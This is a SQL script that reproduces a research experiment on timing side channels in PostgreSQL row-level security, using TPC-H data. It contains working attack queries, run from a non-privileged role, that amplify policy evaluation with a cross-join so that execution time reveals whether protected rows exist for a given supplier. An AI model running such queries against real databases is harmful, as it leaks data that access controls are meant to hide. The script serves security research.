-- ============================================================
-- Timing-Based Side-Channel Experiment on PostgreSQL RLS
-- Based on:
--   C. Dar, M. Hershcovitch, A. Morrison,
--   "RLS Side Channels: Investigating Leakage of Row-Level
--    Security Protected Data Through Query Execution Time"
--   Proc. ACM SIGMOD 2023
--
-- Target DB: PostgreSQL
-- Benchmark: TPC-H
-- Protected Table: lineitem (RLS enabled)
-- Attacker Role: tpch_user (non-superuser, no BYPASSRLS)
-- ============================================================


-- ============================================================
-- 0. ATTACKER CONTEXT
-- ============================================================

SET ROLE tpch_user;

-- Eliminate planner nondeterminism and noise
SET jit = off;
SET enable_indexscan = off;
SET enable_bitmapscan = off;
SET enable_mergejoin = off;
SET enable_hashjoin = off;
SET enable_nestloop = on;
SET max_parallel_workers_per_gather = 0;

-- Ensure timing is visible
--SET track_io_timing = on;


-- ============================================================
-- 1. BASELINE MEASUREMENT (NO POLICY AMPLIFICATION)
-- ============================================================

EXPLAIN (ANALYZE, SUMMARY)
SELECT COUNT(*)
FROM lineitem
WHERE l_shipdate > DATE '1995-03-15';


-- ============================================================
-- 2. ATTACK QUERY TEMPLATE
--
-- Hypothesis:
--   Supplier S supplies customers in the same region
--   as their orders (RLS predicate holds frequently)
--
-- Leakage vector:
--   Execution time difference only
-- ============================================================


-- ------------------------------------------------------------
-- 2.1 Weak Signal (Single RLS Evaluation per tuple)
-- ------------------------------------------------------------
EXPLAIN (ANALYZE, SUMMARY)
WITH params AS (
    SELECT 1001::BIGINT AS test_suppkey
)
SELECT SUM(l.l_extendedprice)
FROM lineitem l, params p
WHERE l.l_shipdate > DATE '1995-03-15'
  AND l.l_suppkey = p.test_suppkey;


-- ------------------------------------------------------------
-- 2.2 Strong Signal (Amplified RLS Evaluation)
--     Cross-join multiplier increases policy executions
-- ------------------------------------------------------------
EXPLAIN (ANALYZE, SUMMARY)
WITH params AS (
    SELECT 1001::BIGINT AS test_suppkey
),
amplifier AS (
    SELECT generate_series(1, 50) AS g
)
SELECT SUM(l.l_extendedprice)
FROM lineitem l
JOIN amplifier a ON true
JOIN params p ON true
WHERE l.l_shipdate > DATE '1995-03-15'
  AND l.l_suppkey = p.test_suppkey;


-- ============================================================
-- 3. CONTROL QUERY
--
-- Hypothesis:
--   Supplier does NOT satisfy RLS predicate
--   (minimal successful joins inside policy)
-- ============================================================
EXPLAIN (ANALYZE, SUMMARY)
WITH params AS (
    SELECT 999999::BIGINT AS test_suppkey  -- unlikely to exist
),
amplifier AS (
    SELECT generate_series(1, 50) AS g
)
SELECT SUM(l.l_extendedprice)
FROM lineitem l
JOIN amplifier a ON true
JOIN params p ON true
WHERE l.l_shipdate > DATE '1995-03-15'
  AND l.l_suppkey = p.test_suppkey;


-- ============================================================
-- 4. OPTIONAL: JSON OUTPUT (FOR AUTOMATED ANALYSIS)
-- ============================================================
EXPLAIN (ANALYZE, FORMAT JSON)
WITH params AS (
    SELECT 1001::BIGINT AS test_suppkey
),
amplifier AS (
    SELECT generate_series(1, 50) AS g
)
SELECT SUM(l.l_extendedprice)
FROM lineitem l
JOIN amplifier a ON true
JOIN params p ON true
WHERE l.l_shipdate > DATE '1995-03-15'
  AND l.l_suppkey = p.test_suppkey;


-- ============================================================
-- END OF EXPERIMENT
-- ============================================================
